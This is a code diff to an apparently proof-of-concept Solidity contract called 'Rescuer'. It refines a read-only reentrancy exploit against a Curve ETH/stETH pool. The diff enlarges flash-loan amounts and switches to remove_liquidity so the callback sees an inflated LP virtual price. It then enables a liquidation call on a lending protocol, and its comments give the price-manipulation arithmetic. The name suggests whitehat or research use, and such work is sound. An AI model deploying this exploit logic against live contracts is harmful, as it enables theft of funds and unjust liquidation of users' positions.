@@ -251,12 +251,14 @@ contract Rescuer {
         //   LP token price in the middle of removing liquidity:  1966561483253545387
         //   LP token supply after removing liquidity: 152693223694457871751602
 
-        // Find x, y, dx, dy which make the condition true:
-        // (A + x - dx + B + y) / (S - dx - dy) > 5.69 * 1.09 // 5.69 is the ratio of collateral to borrow value, 1.09 is the LP token price
+        // Find x, y, dx, dy which make right side >  5.69 * 1.09, 10 is chosen here:
+        // 5.69 is the ratio of collateral to borrow value, 1.09 is the LP token price
+        // (A + 2x - d + B) / (S - 2d) = 10
         // where
-        // A = 34543279685479012272346 // eth balance
-        // B = 35548870433002420435140 // stETH balance
-        // S = (A + x + B + y)
+        // A = 34543
+        // B = 35548
+        // S = (A + 2x + B)
+        // 0 < d <= x
 
         console.log("CurvePool eth balance", address(curvePool).balance);
         console.log("CurvePool stETH balance", stETH.balanceOf(address(curvePool)));
@@ -321,8 +323,8 @@ contract Rescuer {
 
 
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = 100000 ether;
-        amounts[1] = 100000 ether;
+        amounts[0] = 110000 ether;
+        amounts[1] = 172000 ether;
 
         uint256[] memory interestRateModes = new uint256[](2); // leave it to default 0
 
@@ -401,10 +403,12 @@ contract Rescuer {
 
 
         console.log("LP token supply before removing liquidity:", IERC20(curvePool.lp_token()).totalSupply());
-        console.log("Removing from LP stETH", stETHBalance + 30000 ether);
-        uint256 lpTokenBurned = curvePool.remove_liquidity_imbalance([uint256(1), stETHBalance + 30000 ether], lpTokenAmount);
+        // console.log("Removing from LP stETH", stETHBalance + 30000 ether);
+        // uint256 lpTokenBurned = curvePool.remove_liquidity_imbalance([uint256(1), 130000 ether], lpTokenAmount);
         // console.log("LP tokens burned: ", lpTokenBurned);
+        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenAmount, [uint256(0), uint256(0)]);
         console.log("LP token supply after removing liquidity:", IERC20(curvePool.lp_token()).totalSupply());
+
 
 
         weth.deposit{value: address(this).balance}();
@@ -419,8 +423,9 @@ contract Rescuer {
             return;
         }
 
+        // Must be triggered by the remove_liquidty callback, ie. bad state only occurs inside remove_liquidity function
         console.log("LP token price in the middle of removing liquidity: ", curvePool.get_virtual_price());
 
-        // lending.liquidate(users[0]);
+        lending.liquidate(users[0]);
     }
 }
